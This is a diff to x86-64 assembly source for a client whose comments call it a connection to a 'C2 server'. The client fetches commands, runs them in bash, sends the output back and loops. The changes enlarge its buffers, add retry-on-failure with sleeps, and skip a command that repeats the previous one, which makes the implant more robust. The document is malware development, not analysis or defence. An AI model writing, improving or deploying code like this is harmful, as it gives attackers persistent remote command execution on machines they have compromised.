@@ -25,15 +25,17 @@ section .data
     cmd_buffer_old_length dq 0x0            ; Length of the cmd_buffer_old
     tx_buffer_length dq 0x0                 ; Length of the tx_buffer
     status_data dq 0x0                      ; Status of wait4 syscall
+    rx_buffer_max_len dq 0x1000             ; Maximum rx buffer length to avoid hardcoding
+    tx_buffer_max_len dq 0x1000             ; Maximum tx buffer length to avoid hardcoding
 
 section .bss
-    rx_buffer resb 0x400                    ; Receiving buffer from the server, 1KB max
-    tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max
-    cmd_buffer resb 0x100                   ; Buffer for received command
-    cmd_buffer_old resb 0x100               ; Buffer to store last command
+    rx_buffer resb 0x1000                   ; Receiving buffer from the server
+    tx_buffer resb 0x1000                   ; Transmitting buffer to the server
+    cmd_buffer resb 0x1000                  ; Buffer for received command
+    cmd_buffer_old resb 0x1000              ; Buffer to store last command
     argv resq 0x4                           ; Argument values for execve call
     pipe_fd resd 0x2                        ; pipe file descriptors for IPC
-    ascii_post_cl_number resb 0x15          ; ASCII content length for POST, 64 bit number
+    ascii_post_cl_number resb 0x15          ; ASCII content length for POST
     ascii_post_cl_decimal_cnt resb 1        ; To store the number of decimal digits
 
 section .text
@@ -173,10 +175,10 @@ fn_dbg_print_rx_buffer:
     sub rsp, 0x8                ; Stackframe
 
     ; Write buffer to STDOUT
-    mov rax, 0x1                ; read syscall
-    mov rdi, 0x1                ; STDOUT file descriptor
-    lea rsi, [rx_buffer]        ; pointer to the buffer
-    mov rdx, 0x400              ; buffer size
+    mov rax, 0x1                    ; read syscall
+    mov rdi, 0x1                    ; STDOUT file descriptor
+    lea rsi, [rx_buffer]            ; pointer to the buffer
+    mov rdx, [rx_buffer_max_len]    ; buffer size
     syscall
 
     cmp rax, 0
@@ -193,10 +195,10 @@ fn_dbg_print_tx_buffer:
     sub rsp, 0x8                ; Stackframe
 
     ; Write buffer to STDOUT
-    mov rax, 0x1                ; read syscall
-    mov rdi, 0x1                ; STDOUT file descriptor
-    lea rsi, [tx_buffer]        ; pointer to the buffer
-    mov rdx, 0x400              ; buffer size
+    mov rax, 0x1                    ; read syscall
+    mov rdi, 0x1                    ; STDOUT file descriptor
+    lea rsi, [tx_buffer]            ; pointer to the buffer
+    mov rdx, [tx_buffer_max_len]    ; buffer size
     syscall
 
     cmp rax, 0
@@ -669,13 +671,10 @@ fn_connect_client:
     
     ; Connect to socket
     mov rax, 0x2a               ; connect syscall
-    mov rdi, [socket_fd]        ; load socket file descriptor
-    lea rsi, [rsp]              ; address to stack parameter
-    mov rdx, 16                 ; size of sockaddr_in
+    mov rdi, [socket_fd]        ; Load socket file descriptor
+    lea rsi, [rsp]              ; Address to stack parameter
+    mov rdx, 16                 ; Size of sockaddr_in
     syscall
-
-    cmp rax, 0x0                ; error
-    jl fn_error_exit
 
     mov rsp, rbp
     pop rbp
@@ -709,7 +708,7 @@ fn_get_command:
 
     ; Clean rx_buffer after use
     lea rdi, [rx_buffer]
-    mov rsi, 0x400
+    mov rsi, [rx_buffer_max_len]
     call fn_clean_buffer
 
     mov rsp, rbp
@@ -726,6 +725,9 @@ _start:
     ; Connection to C2 server
     call fn_connect_client
 
+    test rax, rax                       ; Verify return code
+    jnz .server_no_connect
+
     ; Get command from server
     call fn_get_command
 
@@ -734,6 +736,14 @@ _start:
     
     ; Execute command in bash
     call fn_exec_cmd
+
+    ; Compare the two commands
+    lea rdi, [cmd_buffer]
+    lea rsi, [cmd_buffer_old]
+    mov rdx, [cmd_buffer_length]
+    call fn_buffer_cmp 
+    test rax, rax
+    je .cleanup
 
     ; Store command into old command buffer, can compare afterwards
     lea rdi, [cmd_buffer_old]
@@ -752,12 +762,21 @@ _start:
     ; Close connection to C2
     call fn_close_socket
 
+.cleanup:
     mov qword [sleep_time], 0x2         ; Sleep 2 seconds
     call fn_sleep
     mov qword [sleep_time], 0x0 
 
     ; Cleanup buffers
     call fn_cleanup
+    jmp .loop
+
+.server_no_connect:
+    ; Close newly made socket
+    call fn_close_socket
+    mov qword [sleep_time], 0x2         ; Sleep 2 seconds
+    call fn_sleep
+    mov qword [sleep_time], 0x0 
     jmp .loop
 
     ; Exit the program
